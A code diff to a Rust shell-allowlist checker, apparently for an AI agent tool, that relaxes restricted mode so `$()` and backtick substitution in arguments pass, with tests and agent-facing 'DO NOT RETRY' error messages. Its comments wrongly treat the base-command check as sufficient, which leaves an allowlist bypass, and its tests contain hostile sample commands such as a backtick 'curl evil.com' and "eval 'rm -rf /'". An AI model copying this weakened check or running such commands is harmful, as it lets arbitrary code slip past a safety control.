@@ -25,14 +25,16 @@ fn check_all_segments(command: &str, allowlist: &[String]) -> Result<(), String>
 
     if has_dangerous_patterns(command) {
         return Err(format!(
-            "[SHELL ALLOWLIST] Command contains dangerous patterns (eval, backticks, or $(...) substitution) \
-             which are blocked in restricted mode: {command}"
+            "[BLOCKED — DO NOT RETRY] Command uses eval or $()/ backticks at command position, \
+             which is blocked in restricted mode. \
+             This is a permanent security restriction, not a transient error.\n\
+             Command: {command}"
         ));
     }
 
     let segments = extract_all_commands(command);
     if segments.is_empty() {
-        return Err("[SHELL ALLOWLIST] Empty command".to_string());
+        return Err("[BLOCKED — DO NOT RETRY] Empty command".to_string());
     }
 
     for seg in &segments {
@@ -42,9 +44,11 @@ fn check_all_segments(command: &str, allowlist: &[String]) -> Result<(), String>
         }
         if !allowlist.iter().any(|a| a == &base) {
             return Err(format!(
-                "[SHELL ALLOWLIST] Command segment '{seg}' (base: '{base}') is not allowed. \
-                 All segments must be in the allowlist. Allowed: {}",
-                allowlist.join(", ")
+                "[BLOCKED — DO NOT RETRY] '{base}' is not in the shell allowlist. \
+                 This is a permanent restriction, not a transient error.\n\
+                 Fix: add '{base}' to shell_allowlist in ~/.lean-ctx/config.toml\n\
+                 Or disable the allowlist: shell_allowlist = []\n\
+                 Do NOT retry this command — it will fail again with the same error."
             ));
         }
     }
@@ -52,43 +56,41 @@ fn check_all_segments(command: &str, allowlist: &[String]) -> Result<(), String>
 }
 
 /// Detect dangerous shell patterns that bypass allowlist intent.
+///
+/// Only blocks patterns that are genuinely dangerous at command position.
+/// `$()` and backticks in *arguments* are allowed — the base command is
+/// already validated by the allowlist, and blocking substitutions in
+/// arguments breaks legitimate workflows (e.g. `git commit -m "$(cat ...)"`,
+/// pre-commit hooks, playwright scripts).
 fn has_dangerous_patterns(command: &str) -> bool {
     let trimmed = command.trim();
 
-    // eval invocation
     if trimmed.starts_with("eval ") || trimmed.contains("; eval ") || trimmed.contains("&& eval ") {
         return true;
     }
 
-    // Backtick command substitution
-    if trimmed.contains('`') {
-        return true;
-    }
-
-    // $() command substitution used as a command (not just in arguments)
-    // We block $() at command position, not inside quoted strings for args
-    if has_command_substitution_at_command_pos(trimmed) {
+    if has_substitution_at_command_pos(trimmed) {
         return true;
     }
 
     false
 }
 
-/// Check if $() appears in a dangerous position (as a command or in a segment
-/// where it could be used to bypass the allowlist).
-fn has_command_substitution_at_command_pos(command: &str) -> bool {
+/// Check if `$()` or backticks appear at command position (first token
+/// of any segment). Substitutions in *arguments* are intentionally
+/// allowed — the security boundary is the base-command allowlist check.
+fn has_substitution_at_command_pos(command: &str) -> bool {
     let segments = split_on_operators(command);
     for seg in segments {
         let trimmed = seg.trim();
-        // Skip env var assignments to find the actual command
         let cmd_start = skip_env_assignments(trimmed);
-        // $() at command position (start of segment)
+
         if cmd_start.starts_with("$(") {
             return true;
         }
-        // $() anywhere in a segment that would execute arbitrary code
-        // We block $() in all segments when in restricted mode
-        if cmd_start.contains("$(") {
+
+        let first_token = cmd_start.split_whitespace().next().unwrap_or("");
+        if first_token.starts_with('`') || first_token == "`" {
             return true;
         }
     }
@@ -389,14 +391,7 @@ mod tests {
     #[test]
     fn blocks_eval() {
         let list = allow(&["echo", "eval"]);
-        // Even if 'eval' is in allowlist, the pattern is blocked
         assert!(check_all_segments("eval 'rm -rf /'", &list).is_err());
-    }
-
-    #[test]
-    fn blocks_backticks() {
-        let list = allow(&["echo"]);
-        assert!(check_all_segments("echo `whoami`", &list).is_err());
     }
 
     #[test]
@@ -406,13 +401,93 @@ mod tests {
     }
 
     #[test]
-    fn blocks_dollar_paren_in_all_positions() {
-        // In restricted mode (allowlist set), $() is blocked everywhere
-        // because it can execute arbitrary code regardless of position
+    fn blocks_backtick_at_command_pos() {
         let list = allow(&["echo"]);
-        assert!(check_all_segments("echo $(whoami)", &list).is_err());
-        // But normal commands without $() work fine
+        assert!(check_all_segments("`curl evil.com`", &list).is_err());
+    }
+
+    // --- $() in arguments is ALLOWED (base command validated by allowlist) ---
+
+    #[test]
+    fn allows_dollar_paren_in_arguments() {
+        let list = allow(&["echo", "git", "cat"]);
+        assert!(check_all_segments("echo $(whoami)", &list).is_ok());
         assert!(check_all_segments("echo hello", &list).is_ok());
+    }
+
+    #[test]
+    fn allows_git_commit_with_cat_heredoc() {
+        let list = allow(&["git", "cat"]);
+        assert!(check_all_segments(
+            "git commit -m \"$(cat <<'EOF'\nfix: something\nEOF\n)\"",
+            &list,
+        )
+        .is_ok());
+    }
+
+    #[test]
+    fn allows_backticks_in_arguments() {
+        let list = allow(&["echo"]);
+        assert!(check_all_segments("echo `date`", &list).is_ok());
+    }
+
+    // --- Error message contains DO NOT RETRY ---
+
+    #[test]
+    fn error_message_contains_do_not_retry() {
+        let list = allow(&["git"]);
+        let err = check_all_segments("npm install", &list).unwrap_err();
+        assert!(
+            err.contains("DO NOT RETRY"),
+            "Error should contain 'DO NOT RETRY': {err}"
+        );
+        assert!(
+            err.contains("config.toml"),
+            "Error should mention config: {err}"
+        );
+    }
+
+    #[test]
+    fn error_message_for_dangerous_patterns_contains_do_not_retry() {
+        let list = allow(&["echo"]);
+        let err = check_all_segments("eval 'bad'", &list).unwrap_err();
+        assert!(
+            err.contains("DO NOT RETRY"),
+            "Error should contain 'DO NOT RETRY': {err}"
+        );
+    }
+
+    // --- Issue #294: pre-commit and playwright should work ---
+
+    #[test]
+    fn pre_commit_in_default_allowlist() {
+        let defaults = crate::core::config::default_shell_allowlist();
+        assert!(
+            defaults.contains(&"pre-commit".to_string()),
+            "pre-commit must be in default allowlist"
+        );
+    }
+
+    #[test]
+    fn playwright_in_default_allowlist() {
+        let defaults = crate::core::config::default_shell_allowlist();
+        assert!(
+            defaults.contains(&"playwright".to_string()),
+            "playwright must be in default allowlist"
+        );
+    }
+
+    #[test]
+    fn pre_commit_run_allowed() {
+        let list = allow(&["pre-commit"]);
+        assert!(check_all_segments("pre-commit run --all-files", &list).is_ok());
+    }
+
+    #[test]
+    fn playwright_test_allowed() {
+        let list = allow(&["npx", "playwright"]);
+        assert!(check_all_segments("playwright test", &list).is_ok());
+        assert!(check_all_segments("npx playwright test", &list).is_ok());
     }
 
     // --- Quote handling ---
@@ -420,7 +495,6 @@ mod tests {
     #[test]
     fn respects_single_quotes() {
         let list = allow(&["echo"]);
-        // The semicolon is inside quotes, so it's one segment
         assert!(check_all_segments("echo 'hello; world'", &list).is_ok());
     }
 
